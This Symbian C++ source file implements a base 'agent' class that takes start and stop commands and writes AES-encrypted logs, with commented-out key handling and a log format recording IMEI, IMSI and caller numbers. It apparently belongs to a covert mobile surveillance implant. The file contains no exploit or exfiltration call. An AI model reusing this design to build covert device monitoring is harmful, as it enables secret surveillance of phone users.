/*
 ============================================================================
 Name		: AbstractAgent.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAbstractAgent implementation
 ============================================================================
 */
#include "AbstractAgent.h"
#include <bautils.h>
#include <HT\FileUtils.h>

#include <HT\AES.h>
#include <HT\AbstractQueueEndPoint.h>
#include <HT\LogFile.h>          // for KAES_LOGS_KEY



EXPORT_C CAbstractAgent::CAbstractAgent(TAgentType aType) :
	CAbstractQueueEndPoint(aType)
	{
	// No implementation required
	}

EXPORT_C CAbstractAgent::~CAbstractAgent()
	{
	__FLOG(_L("Destructor"));
	delete iLogFile;
	iFs.Close();
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

EXPORT_C void CAbstractAgent::BaseConstructL(const TDesC8& params)
	{
	CAbstractQueueEndPoint::BaseConstructL(params);
	User::LeaveIfError(iFs.Connect());

	__FLOG_OPEN_ID("HT", "AbstractAgent.txt");
	__FLOG(_L("-------------"));
	}

void CAbstractAgent::DispatchCommandL(TCmdStruct aCommand)
	{
	switch (aCommand.iType)
		{
		case EStart:
			__FLOG(_L("StartAgentCmtL"));
			StartAgentCmdL();
			break;
		case ERestart:
			StopAgentCmdL();
			StartAgentCmdL();
			break;
		case EStop:
			__FLOG(_L("StopAgentCmtL"));
			StopAgentCmdL();
			// Agents will not receive any more commands after the "STOP"
			SetReceiveCmd(EFalse);
			break;
		default:
			break;
		}
	MarkCommandAsDispatchedL();
	}

EXPORT_C void CAbstractAgent::CreateLogL(TInt aLogId)
	{
	delete iLogFile;
	iLogFile = NULL;
	iLogFile = CLogFile::NewL(iFs);
	iLogFile->CreateLogL(aLogId);
	}

EXPORT_C void CAbstractAgent::CreateLogL(TInt aLogId,TAny* aAdditionalData)
	{
	delete iLogFile;
	iLogFile = NULL;
	iLogFile = CLogFile::NewL(iFs);
	iLogFile->CreateLogL(aLogId,aAdditionalData);
	}

EXPORT_C void CAbstractAgent::AppendLogL(const TDesC8& data)
	{
	if (iLogFile)
		iLogFile->AppendLogL(data);
	}

EXPORT_C void CAbstractAgent::CloseLogL()
	{
	if (iLogFile)
		iLogFile->CloseLogL();
	delete iLogFile;
	iLogFile = NULL;
	}

/*
EXPORT_C void CAbstractAgent::WriteMarkupL(const TDesC8& aData)
	{
	TFullName filename;
	filename.AppendNum(Type());
	FileUtils::CompleteWithPrivatePathL(iFs, filename);
	RFile markupFile;
	markupFile.Replace(iFs, filename, EFileWrite | EFileStream | EFileShareExclusive);
	
	// Convert key from string to hexa buffer
	TBuf8<16> hexaKey;
	for(TInt i = 0; i<32; i = i+2){
		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
		TUint8 val;
		lex.Val(val,EHex);
		hexaKey.Append(val);
	}
	
	RBuf8 encrypted(AES::EncryptL(aData, KIV, hexaKey.Left(K_KEY_SIZE)));
	encrypted.CleanupClosePushL();
	//markupFile.Write(aData);
	markupFile.Write(encrypted);
	markupFile.Close();
	CleanupStack::PopAndDestroy(&encrypted);
			
	}
*/

/*
EXPORT_C HBufC8* CAbstractAgent::ReadMarkupL()
	{
	TFullName filename;
	filename.AppendNum(Type());
	FileUtils::CompleteWithPrivatePathL(iFs, filename);
	//return FileUtils::ReadFileContentsL(iFs, filename);
	return DecryptMarkupL(iFs, filename);
	}
*/
/*
EXPORT_C TBool CAbstractAgent::ExistsMarkupL()
	{
	TFullName filename;
	filename.AppendNum(Type());
	FileUtils::CompleteWithPrivatePathL(iFs, filename);
	return BaflUtils::FileExists(iFs, filename);
	}
*/
/*
EXPORT_C void CAbstractAgent::RemoveMarkupL()
	{
	if (!ExistsMarkupL())
		return;
	TFullName filename;
	filename.AppendNum(Type());
	FileUtils::CompleteWithPrivatePathL(iFs, filename);
	BaflUtils::DeleteFile(iFs, filename);
	}
*/
/*
EXPORT_C HBufC8* CAbstractAgent::DecryptMarkupL(RFs& fs,const TDesC& fname)
	{

	// Convert key from string to hexa buffer
	TBuf8<16> hexaKey;
	for(TInt i = 0; i<32; i = i+2){
		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
		TUint8 val;
		lex.Val(val,EHex);
		hexaKey.Append(val);
	}
				
	__FLOG(_L8("DecryptMarkupL Begin"));
	HBufC8* buf = FileUtils::ReadFileContentsL(fs, fname);
	CleanupStack::PushL(buf);

	// Diff + AES[Len + Data + CRC]

	// removes Diff
	// buf->Des().Delete(0, 8);

	__FLOG(_L8("AES::DecryptL() Begin"));
	//RBuf8 plain(AES::DecryptL(buf->Des(), KIV, KAES_CONFIG_KEY));
	RBuf8 plain(AES::DecryptL(buf->Des(), KIV, hexaKey));
	plain.CleanupClosePushL();
	__FLOG(_L8("AES::DecryptL() End"));

	if (plain.Length() == 0)
		{
		CleanupStack::PopAndDestroy(&plain);
		CleanupStack::Pop(buf);
		buf->Des().SetLength(0);
		return buf;
		}

	
	TUint32 len = 0;
	Mem::Copy(&len, plain.Ptr(), 4);
	__FLOG_1(_L8("Len:%d"), len);

	// If these checks fails, it means that the file has not been decrypted correctly 
	if (len <= 8 || len > plain.MaxLength())
		{
		CleanupStack::PopAndDestroy(&plain);
		CleanupStack::Pop(buf);
		buf->Des().SetLength(0);
		return buf;
		}
	
	// Removes unneeded data from the end (AES padding)
	__FLOG_1(_L8("Len:%d"), plain.Length());
	plain.SetLength(len);

	// Removes Len from the beginning
	plain.Delete(0, 4);
	buf->Des().Copy(plain);
			
	CleanupStack::PopAndDestroy(&plain);
	CleanupStack::Pop(buf);
	__FLOG(_L8("DecryptMarkupL End"));
	return buf;
	}
*/
/*
 
 #define LOG_VERSION_01 (UINT)2008121901  0x77B1822D
 
 
 UInt32 Lunghezza di LogStruct e di tutti i dati tranne i Data Chunks, paddata al multiplo di AES_BLOCK_SIZE (16)

 [START DATI CIFRATI CON AES]
 typedef struct _LogStruct 
 {
 UINT uVersion;			// Versione della struttura
 UINT uLogType;			// Tipo di log
 UINT uHTimestamp;		// Parte alta del timestamp
 UINT uLTimestamp;		// Parte bassa del timestamp
 UINT uDeviceIdLen;		// IMEI/Hostname len
 UINT uUserIdLen;		// IMSI/Username len
 UINT uSourceIdLen;		// Numero del caller/IP len ????????????????
 UINT uAdditionalData;		// Lunghezza della struttura addizionale, se presente (imposto sempre a zero)
 } LogStruct, *pLogStruct;

 DeviceID
 UserID
 SourceID
 AdditionalData
 
 ...padding...
 [END DATI CIFRATI CON AES]


 Tanti Data Chunk composti come:
 UInt32 lunghezza reale del blocco dati
 [DATI CIFRATI CON AES] 
 
 */
